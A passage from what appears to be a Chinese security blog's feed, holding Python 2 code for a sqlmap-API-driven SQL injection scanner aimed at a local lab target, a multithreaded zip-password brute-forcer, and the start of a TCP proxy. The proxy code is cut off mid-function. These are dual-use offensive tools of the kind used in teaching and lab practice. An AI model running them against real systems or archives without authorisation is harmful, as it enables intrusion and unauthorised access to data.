&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">write_to_file&lt;/span>(self,msg):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;result.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;a+&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#f92672">.&lt;/span>write(json&lt;span style="color:#f92672">.&lt;/span>dumps(msg)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>new_task():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_option()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>start_scan():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>get_status() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;running&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sleep(&lt;span style="color:#ae81ff">10&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>get_status() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;terminated&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_data()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>write_to_file(self&lt;span style="color:#f92672">.&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>delete_task()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;http://127.0.0.1:8775&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;http://192.168.188.134/sqli/Less-1/?id=1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqli &lt;span style="color:#f92672">=&lt;/span> Sqli(server, target)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqli&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqli&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Python 爆破 zip 压缩包</title><link>https://wyb0.cn/posts/2016/python-blasting-zip-archive/</link><pubDate>Tue, 20 Sep 2016 14:50:59 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-blasting-zip-archive/</guid><description>&lt;h3 id="0x00-代码">0x00 代码&lt;/h3>
&lt;p>多线程爆破加密的zip压缩包&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> optparse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> Queue
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>queue &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lock &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Lock()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">load_pwd&lt;/span>(filename):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> line &lt;span style="color:#f92672">in&lt;/span> open(filename,&lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> line:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>put(line&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">bruter&lt;/span>(zipname,queue):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zFile &lt;span style="color:#f92672">=&lt;/span> zipfile&lt;span style="color:#f92672">.&lt;/span>ZipFile(zipname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> password &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>get()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zFile&lt;span style="color:#f92672">.&lt;/span>extractall(pwd&lt;span style="color:#f92672">=&lt;/span>password) &lt;span style="color:#75715e"># 解压&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[Ok] password is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[Error] password not is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>task_done()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> optparse&lt;span style="color:#f92672">.&lt;/span>OptionParser()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-f&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--file&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;zipfile&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Target zip file.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--pfile&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pwdfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pass.txt&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Password file.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-t&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--thread_num&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;thread_num&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">60&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Thread number.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>zipfile &lt;span style="color:#f92672">and&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>pwdfile:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> load_pwd(options&lt;span style="color:#f92672">.&lt;/span>pwdfile)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> range(options&lt;span style="color:#f92672">.&lt;/span>thread_num):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>bruter,args&lt;span style="color:#f92672">=&lt;/span>(options&lt;span style="color:#f92672">.&lt;/span>zipfile,queue,))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;result is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Python 实现代理</title><link>https://wyb0.cn/posts/2016/python-implement-agent/</link><pubDate>Tue, 13 Sep 2016 11:36:39 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-implement-agent/</guid><description>&lt;h3 id="0x00-帮助信息">0x00 帮助信息&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/python_proxy_help.png" alt="帮助信息">&lt;/p>
&lt;h3 id="0x01-代码如下">0x01 代码如下&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;This is a proxy&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__author__ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;xxx&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> socket
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> optparse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lock &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Lock()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">locker&lt;/span>(msg):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print msg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">hexdump&lt;/span> (src,length&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>):&lt;span style="color:#75715e">#十六进制导出函数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> digits &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> isinstance(src,unicode) &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">0&lt;/span>,len(src),length):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> src[i:i&lt;span style="color:#f92672">+&lt;/span>length]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hexa &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(&lt;span style="color:#e6db74">&amp;#34;[&lt;/span>&lt;span style="color:#e6db74">%0*X&lt;/span>&lt;span style="color:#e6db74">]&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (digits,ord(x)) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([x &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> ord(x) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x7F&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> s])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%04X&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">%-*s&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (i,length&lt;span style="color:#f92672">*&lt;/span>(digits&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>),hexa,text))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">receive_from&lt;/span> (connection):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buffer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#我们设置了1秒的超时，这取决于目标的情况，可能需要调整&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connection&lt;span style="color:#f92672">.&lt;/span>settimeout(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#持续从缓存中读取数据直到没有数据或者超时&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> connection&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">4096&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> data:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buffer &lt;span style="color:#f92672">+=&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> buffer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#对目标是远程主机的请求进行修改&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">request_handler&lt;/span> (buffer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#执行包修改&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> buffer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#对目标是本地主机的响应进行修改&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">response_handler&lt;/span> (buffer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#执行包修改&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> buffer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">proxy_handler&lt;/span> (client_socket,remote_host,remote_port,receive_first):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#连接远程主机&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_socket &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>socket(socket&lt;span style="color:#f92672">.&lt;/span>AF_INET,socket&lt;span style="color:#f92672">.&lt;/span>SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_socket&lt;span style="color:#f92672">.&lt;/span>connect((remote_host,remote_port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#如果必要从远程主机接收数据&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> receive_first:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_buffer &lt;span style="color:#f92672">=&lt;/span> receive_from(remote_socket)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(remote_buffer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">[==&amp;gt;] Received &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> bytes from remote.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> len(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># hexdump(remote_buffer)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#发送给我们的相应处理&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_buffer &lt;span style="color:#f92672">=&lt;/span> response_handler(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#若我们有数据传递给本地客户端，发送它&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(remote_buffer):
